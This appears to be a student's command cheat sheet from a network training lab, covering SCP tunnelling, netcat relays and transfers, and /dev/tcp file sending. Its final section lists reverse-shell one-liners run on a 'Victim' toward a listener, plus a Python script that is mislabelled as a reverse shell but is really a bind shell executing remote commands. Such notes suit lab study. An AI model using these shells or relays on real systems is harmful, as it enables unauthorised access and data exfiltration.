# Commands

find / -name hint* 2> /dev/null
find / -name flag* 2> /dev/null
ss -ntlp


















- mknod                                                              # make a node in memory. needed for named pipes in netcat two way tunnel
- mknod mypipe p                                                     # Example of a node
- nc -lvp 10.0.0.1:1111 < mypipe | nc -lvp 10.0.0.2:3333 > mypipe    # Example to direct connect the two devices with a netcat relay
- nc -lp 1111 < mypipe | nc -lp 2222 > mypipe                        # Example for a relay that just opens the ports and waits for the other devices to connect.

## FTP Commands
> FTP commands to download and travers
- ls         # list directory
- pwd        # show present directory
- cd         # change directories
- get        # Download a file  
- wget -r    # recursively get everthing in the present directory. 
> you can specify the port like this.
- wget -r 10.0.0.103:1000 

## SCP
### SCP Options
```
.  - Present working directory
-v - verbose mode
-P - alternate port
-r - recursively copy an entire directory
-3 - 3-way copy
```

### SCP Syntax
- Download a file from a remote directory to a local directory
```$ scp student@172.16.82.106:secretstuff.txt /home/student```
- Upload a file to a remote directory from a local directory
```$ scp secretstuff.txt student@172.16.82.106:/home/student```
- Copy a file from a remote host to a separate remote host
```
$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
password:    password:
```

### SCP Syntax
- Recursive upload of a folder to remote
```$ scp -r folder/ student@172.16.82.106:```
- Recursive download of a folder from remote
```$ scp -r student@172.16.82.106:folder/ .```

### SCP Syntax w/ alternate SSHD
- Download a file from a remote directory to a local directory
```$ scp -P 1111 student@172.16.82.106:secretstuff.txt .```
- Upload a file to a remote directory from a local directory
```$ scp -P 1111 secretstuff.txt student@172.16.82.106:```

### SCP Syntax through a tunnel
- Create a local port forward to target device
```$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT```
- Download a file from a remote directory to a local directory
```$ scp -P 1111 student@localhost:secretstuff.txt /home/student```
- Upload a file to a remote directory from a local directory
```$ scp -P 1111 secretstuff.txt student@localhost:/home/student```

### SCP Syntax through a Dynamic Port forward
- Create a Dynamic Port Forward to target device
```$ ssh student@172.16.82.106 -D 9050 -NT```
- Download a file from a remote directory to a local directory
```$ proxychains scp student@localhost:secretstuff.txt .```
- Upload a file to a remote directory from a local directory
```$ proxychains scp secretstuff.txt student@localhost:```


## NETCAT
### NETCAT: Client to Listener file transfer
- Listener (receive file):
```nc -lvp 9001 > newfile.txt```
- Client (sends file):
```nc 172.16.82.106 9001 < file.txt```


### NETCAT: Listener to Client file transfer
- Listener (sends file):
```nc -lvp 9001 < file.txt```
- Client (receive file):
```nc 172.16.82.106 9001 > newfile.txt```


### NETCAT Relay Demos
> Listener - Listener
- On Blue_Host-1 Relay:
```
$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
```
- On Internet_Host (send):
```$ nc 172.16.82.106 1111 < secret.txt```
- On Blue_Priv_Host-1 (receive):
```$ nc 192.168.1.1 3333 > newsecret.txt```


### NETCAT Relay Demos
> Client - Client
- On Internet_Host (send):
```$ nc -lvp 1111 < secret.txt```
- On Blue_Priv_Host-1 (receive):
```$ nc -lvp 3333 > newsecret.txt```
- On Blue_Host-1 Relay:
```
$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```

### NETCAT Relay Demos
> Client - Listener
- On Internet_Host (send):
```$ nc -lvp 1111 < secret.txt```
- On Blue_Priv_Host-1 (receive):
```$ nc 192.168.1.1 3333 > newsecret.txt```
- On Blue_Host-1 Relay:
```
$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
```

### NETCAT Relay Demos
> Listener - Client
- On Internet_Host (send):
```$ nc 172.16.82.106 1111 < secret.txt```
- On Blue_Priv_Host-1 (receive):
```$ nc -lvp 3333 > newsecret.txt```
- On Blue_Host-1 Relay:
```
$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
```
nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe
### File Transfer with /dev/tcp
- On the receiving box:
```$ nc -lvp 1111 > devtcpfile.txt```
- On the sending box:
```$ cat secret.txt > /dev/tcp/10.10.0.40/1111```
- This method is useful for a host that does not have NETCAT available.


## Reverse Shells
https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html#_9_3_reverse_shells


### Reverse shell using NETCAT
- First listen for the shell on your device.
```$ nc -lvp 9999```
- On Victim using -c :
```$ nc -c /bin/bash 10.10.0.40 9999```
- On Victim using -e :
```$ nc -e /bin/bash 10.10.0.40 9999```



### Reverse shell using /DEV/TCP
- First listen for the shell on your device.
```$ nc -lvp 9999```
- On Victim:
```$ /bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1```


### Reverse shell Python3
```
#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()
```




```
ssh -p <optional alt port> <user>@<server ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
or
ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip> -NT
```

























